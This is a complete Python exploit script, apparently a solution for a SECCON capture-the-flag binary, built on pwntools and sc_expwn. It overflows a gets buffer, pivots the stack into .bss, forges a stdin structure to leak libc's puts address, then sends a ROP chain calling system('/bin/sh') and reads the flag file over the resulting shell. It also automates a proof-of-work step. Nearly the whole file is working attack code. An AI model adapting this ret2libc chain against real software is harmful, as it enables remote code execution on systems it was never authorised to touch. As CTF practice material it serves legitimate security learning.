#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':7428}, \
                        monitor = {'host':os.getenv('SECCON_HOST'), 'port':os.getenv('SECCON_PORT')})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6', \
                        monitor = 'libc.so.6')
env.select(args.ENV or 'monitor')

#==========

binf = ELF(bin_file)
addr_plt_puts       = binf.plt['puts']

addr_main           = binf.sep_function['main']
addr_gets_rbp       = 0x4011be

addr_bss            = binf.sep_section['.bss']
addr_bss_stack      = addr_bss + 0xf00

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_puts       = libc.sep_function['puts']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)

    exploit  = b'a'*0x10
    exploit += flat(addr_bss_stack, addr_gets_rbp)
    conn.sendlineafter(b'>\n', exploit)

    exploit  = b'b'*0x10
    exploit += flat(addr_bss_stack-0x68+0x10, addr_gets_rbp)
    exploit += flat(0x20, addr_bss_stack+0x10)
    exploit += flat(addr_plt_puts, addr_main)
    fake_stdin  = b'\x00'*0x88
    fake_stdin += p64(addr_bss_stack - 0x28)
    conn.sendline(exploit + fake_stdin)

    addr_fake_stdin = addr_bss_stack-0x10 + len(exploit)

    exploit  = p64(0xdeadbeef)          # rbx (fake)
    exploit += p64(addr_fake_stdin)     # r12: [r12+0x88] -> rdi
    exploit += p64(addr_bss_stack+0x18) # r13: [[r13]] & 0x20 != 0, rbp
    exploit += p64(rop.leave.address)   # r14                     , retaddr
    conn.sendline(exploit)

    addr_libc_puts = u(conn.recvline(keepends=False)) - 0x7d
    libc.address = addr_libc_puts - ofs_libc_puts
    success('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)

    exploit  = b'c'*0x18
    exploit += bytes(rop)
    conn.sendlineafter(b'>\n', exploit)

def redpwn_pow(conn, **kwargs):
    m = conn.recvregex(br'sh -s ([^\s]+)\n', capture=True)

    p = process('./redpwnpow {}'.format(m.group(1).decode()).split())
    p.wait_for_close()
    token = p.recv().split()[0]

    info(f'token : {token}')
    conn.sendlineafter(b'solution: ', token)

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline(b'exec 2>&1')
    sleep(0.1)
    conn.sendline(b'echo FLAG_HERE; cat flag*')
    conn.recvuntil(b'FLAG_HERE\n')
    print('FLAG : %s' % conn.recvline(keepends=False).decode())

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()

    if env.check(['remote', 'monitor']):
        comn.run(redpwn_pow)

    comn.run(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.interactive()

if __name__=='__main__':
    main()

#==========
